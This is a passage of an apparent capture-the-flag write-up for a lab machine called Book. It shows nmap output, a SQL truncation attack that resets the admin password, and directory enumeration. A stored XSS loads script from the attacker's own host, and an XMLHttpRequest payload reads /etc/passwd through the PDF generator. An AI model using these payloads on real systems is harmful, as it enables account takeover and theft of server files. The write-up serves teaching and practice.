</span></span><span class=line><span class=cl>|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
</span></span><span class=line><span class=cl>|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
</span></span><span class=line><span class=cl>| http-cookie-flags:
</span></span><span class=line><span class=cl>|   /:
</span></span><span class=line><span class=cl>|     PHPSESSID:
</span></span><span class=line><span class=cl>|_      httponly flag not set
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.29 (Ubuntu)
</span></span><span class=line><span class=cl>|_http-title: LIBRARY - Read | Learn | Have Fun
</span></span><span class=line><span class=cl>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
</span></span><span class=line><span class=cl>TCP/IP fingerprint:
</span></span><span class=line><span class=cl>OS:SCAN(V=7.80%E=4%D=3/26%OT=22%CT=1%CU=39363%PV=Y%DS=2%DC=T%G=Y%TM=5E7D31E
</span></span><span class=line><span class=cl>OS:7%P=x86_64-unknown-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=
</span></span><span class=line><span class=cl>OS:A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M5
</span></span><span class=line><span class=cl>OS:4DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE8
</span></span><span class=line><span class=cl>OS:8)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S
</span></span><span class=line><span class=cl>OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=
</span></span><span class=line><span class=cl>OS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%
</span></span><span class=line><span class=cl>OS:A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%
</span></span><span class=line><span class=cl>OS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=
</span></span><span class=line><span class=cl>OS:40%CD=S)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Network Distance: 2 hops
</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>TRACEROUTE (using port 993/tcp)
</span></span><span class=line><span class=cl>HOP RTT      ADDRESS
</span></span><span class=line><span class=cl>1   30.66 ms 10.10.14.1
</span></span><span class=line><span class=cl>2   30.79 ms 10.10.10.176
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Thu Mar 26 23:51:19 2020 -- 1 IP address (1 host up) scanned in 20.68 seconds
</span></span></code></pre></td></tr></table></div></div><p>Only port 22 and 80, so we must start by attacking a web application.</p><h3 id=web-application-enumeration-and-exploitation>Web application enumeration and exploitation<a hidden class=anchor aria-hidden=true href=#web-application-enumeration-and-exploitation>#</a></h3><p>Let&rsquo;s start at http://10.10.10.176/</p><p>We can create an account and login.</p><p><img loading=lazy src=https://i.imgur.com/NiFOCZz.jpg alt></p><p>At http://10.10.10.176/contact.php there is form sending a message to
<code>admin@book.htb</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;POST&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;myForm&#34;</span> <span class=na>onsubmit</span><span class=o>=</span><span class=s>&#34;return validateForm()&#34;</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nb>document</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>search</span><span class=p>.</span><span class=nx>match</span><span class=p>(</span><span class=sr>/type=embed/gi</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>window</span><span class=p>.</span><span class=nx>parent</span><span class=p>.</span><span class=nx>postMessage</span><span class=p>(</span><span class=s2>&#34;resize&#34;</span><span class=p>,</span> <span class=s2>&#34;*&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>validateForm</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>x</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>forms</span><span class=p>[</span><span class=s2>&#34;myForm&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>].</span><span class=nx>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>y</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>forms</span><span class=p>[</span><span class=s2>&#34;myForm&#34;</span><span class=p>][</span><span class=s2>&#34;email&#34;</span><span class=p>].</span><span class=nx>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>x</span> <span class=o>==</span> <span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>alert</span><span class=p>(</span><span class=s2>&#34;Please fill name field. Should not be more than 10 characters&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>y</span> <span class=o>==</span> <span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>alert</span><span class=p>(</span><span class=s2>&#34;Please fill email field. Should not be more than 20 characters&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>So the size of the fields are limited to:</p><ul><li>name &lt;= 10</li><li>email &lt;= 20</li></ul><p>If they put a limit client-side there is maybe a limitation server-side too.
We can try a SQL truncation.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ irb
</span></span><span class=line><span class=cl>irb(main):001:0&gt; &#39;admin@book.htb&#39;.size
</span></span><span class=line><span class=cl>=&gt; 14
</span></span><span class=line><span class=cl>irb(main):002:0&gt; &#39;admin@book.htb&#39; + &#39; &#39; * 6 + &#39;cyfun&#39;
</span></span><span class=line><span class=cl>=&gt; &#34;admin@book.htb      cyfun&#34;
</span></span></code></pre></td></tr></table></div></div><p>The size of the mail address of the admin is 14, so by adding 6 whitespaces we
will reach 20 and we will begin to truncate. Let&rsquo;s try to send this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /index.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: book.htb
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=6cn5fv2fpmmfec6tjkvr1v3sto
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>name=cyfunadmin&amp;email=admin@book.htb      cyfun&amp;password=cyfun
</span></span></code></pre></td></tr></table></div></div><p>The server will look if the email <code>admin@book.htb cyfun</code> already exists,
of course it&rsquo;s not, so when creating our account the MySQL database will
will cut whatever is appended after 20 chars and remove spaces, so it will
end by updating the password of the already existing <code>admin@book.htb</code>.</p><p>We can find the admin login page http://10.10.10.176/admin/index.php
with <a href=https://github.com/maurosoria/dirsearch>dirsearch</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ dirsearch -u http://10.10.10.176/ -e php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> _|. _ _  _  _  _ _|_    v0.3.9
</span></span><span class=line><span class=cl>(_||| _) (/_(_|| (_| )
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Extensions: php | HTTP method: get | Threads: 10 | Wordlist size: 6046
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Error Log: /home/cyfun/.dirsearch/logs/errors-20-04-19_17-38-41.log
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Target: http://10.10.10.176/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[17:38:42] Starting:
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>[17:38:45] 301 -  312B  - /admin  -&gt;  http://10.10.10.176/admin/
</span></span><span class=line><span class=cl>[17:38:46] 200 -    6KB - /admin/
</span></span><span class=line><span class=cl>[17:38:46] 403 -  277B  - /admin/.htaccess
</span></span><span class=line><span class=cl>[17:38:46] 200 -    6KB - /admin/?/login
</span></span><span class=line><span class=cl>[17:38:46] 302 -    0B  - /admin/home.php  -&gt;  index.php
</span></span><span class=line><span class=cl>[17:38:46] 200 -    6KB - /admin/index.php
</span></span><span class=line><span class=cl>[17:38:52] 301 -  311B  - /docs  -&gt;  http://10.10.10.176/docs/
</span></span><span class=line><span class=cl>[17:38:52] 403 -  277B  - /docs/
</span></span><span class=line><span class=cl>[17:38:53] 302 -    0B  - /home.php  -&gt;  index.php
</span></span><span class=line><span class=cl>[17:38:54] 301 -  313B  - /images  -&gt;  http://10.10.10.176/images/
</span></span><span class=line><span class=cl>[17:38:54] 200 -    7KB - /index.php
</span></span><span class=line><span class=cl>[17:38:54] 200 -    7KB - /index.php/login/
</span></span><span class=line><span class=cl>[17:38:59] 403 -  277B  - /server-status
</span></span><span class=line><span class=cl>[17:38:59] 403 -  277B  - /server-status/
</span></span><span class=line><span class=cl>[17:38:59] 302 -    0B  - /settings.php  -&gt;  index.php
</span></span></code></pre></td></tr></table></div></div><p>So we can login as the administrator.</p><p>On the <em>Collections</em> page <a href=http://book.htb/admin/collections.php>http://book.htb/admin/collections.php</a> we can download
a PDF all the users or all the books that seems dynamically generated.</p><p>Note: we can&rsquo;t exploit the XSS in the name because it is limited to 10 chars.</p><p>Also in the user interface there is a <em>Collections</em> page <a href=http://book.htb/collections.php>http://book.htb/collections.php</a>
where any user can submit a new book.</p><p>So we could probably inject a XSS payload in the book title, that will be
embedded in the dynamically generated book collection PDF so we execute
JavaScript code in the context of the backend (maybe a bot or script using
phantom.js).</p><p>So we just have to use a simple XSS payload to server our local script.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;http://10.10.15.117:8000/cyfun.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ python -m http.server --bind 10.10.15.117
</span></span></code></pre></td></tr></table></div></div><p>With the code execution we can try to do a SSRF (Server Side Request Forgery)
with a XRH (XMLHttpRequest).
We can then make requests with the <code>file://</code> pseudo-protocol to read local
files.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>xhr</span><span class=o>=</span><span class=k>new</span> <span class=nx>XMLHttpRequest</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>xhr</span><span class=p>.</span><span class=nx>onload</span><span class=o>=</span><span class=kd>function</span><span class=p>(){</span> <span class=nb>document</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=nx>btoa</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=nx>responseText</span><span class=p>))</span> <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nx>xhr</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s2>&#34;GET&#34;</span><span class=p>,</span> <span class=s2>&#34;file:///etc/passwd&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>xhr</span><span class=p>.</span><span class=nx>send</span><span class=p>();</span>
</span></span></code></pre></td></tr></table></div></div><p>It takes several minutes before our book is added to the collection so we can
monitor at the search page (searching by author) when it is added
<a href=http://book.htb/search.php>http://book.htb/search.php</a>.</p><p>Then you have to be quick after the book was added to generate the PDF to trigger
the XSS because the user book are removed very often.
<a href="http://book.htb/admin/collections.php?type=collections">http://book.htb/admin/collections.php?type=collections</a></p><p>Then the PDF contains the base64 encoded string corresponding to the file we asked for.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kL25ldGlmOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQvcmVzb2x2ZTovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDI6MTA2OjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA0OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KbHhkOng6MTA1OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKdXVpZGQ6eDoxMDY6MTEwOjovcnVuL3V1aWRkOi91c3Ivc2Jpbi9ub2xvZ2luCmRuc21hc3E6eDoxMDc6NjU1MzQ6ZG5zbWFzcSwsLDovdmFyL2xpYi9taXNjOi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwODoxMTI6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMDk6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTEwOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4KcmVhZGVyOng6MTAwMDoxMDAwOnJlYWRlcjovaG9tZS9yZWFkZXI6L2Jpbi9iYXNoCm15c3FsOng6MTExOjExNDpNeVNRTCBTZXJ2ZXIsLCw6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UK
</span></span></code></pre></td></tr></table></div></div><p>Note: I opened the PDF with libreoffice as when I opened it with Okular as it is
all in one line the text was truncated.</p><p>Then we can decode the text like this <code>printf %s 'base64 here' | base64 -d</code></p><p><code>/etc/passwd</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>root</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>0</span><span class=p>:</span><span class=mi>0</span><span class=p>:</span><span class=n>root</span><span class=p>:</span><span class=o>/</span><span class=n>root</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=n>daemon</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=n>daemon</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>bin</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>2</span><span class=p>:</span><span class=mi>2</span><span class=p>:</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>sys</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>3</span><span class=p>:</span><span class=mi>3</span><span class=p>:</span><span class=n>sys</span><span class=p>:</span><span class=o>/</span><span class=n>dev</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>sync</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>4</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>sync</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sync</span>
</span></span><span class=line><span class=cl><span class=n>games</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>5</span><span class=p>:</span><span class=mi>60</span><span class=p>:</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>man</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>6</span><span class=p>:</span><span class=mi>12</span><span class=p>:</span><span class=n>man</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>cache</span><span class=o>/</span><span class=n>man</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>lp</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span><span class=n>lp</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>lpd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>mail</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>8</span><span class=p>:</span><span class=mi>8</span><span class=p>:</span><span class=n>mail</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>mail</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>news</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>9</span><span class=p>:</span><span class=mi>9</span><span class=p>:</span><span class=n>news</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>news</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>uucp</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=n>uucp</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>uucp</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>proxy</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=n>proxy</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>33</span><span class=p>:</span><span class=mi>33</span><span class=p>:</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>backup</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>34</span><span class=p>:</span><span class=mi>34</span><span class=p>:</span><span class=n>backup</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>backups</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>list</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=n>Mailing</span> <span class=n>List</span> <span class=n>Manager</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>list</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>irc</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>39</span><span class=p>:</span><span class=mi>39</span><span class=p>:</span><span class=n>ircd</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>ircd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>gnats</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>41</span><span class=p>:</span><span class=mi>41</span><span class=p>:</span><span class=n>Gnats</span> <span class=n>Bug</span><span class=o>-</span><span class=n>Reporting</span> <span class=n>System</span> <span class=p>(</span><span class=n>admin</span><span class=p>):</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>gnats</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>nobody</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>nobody</span><span class=p>:</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
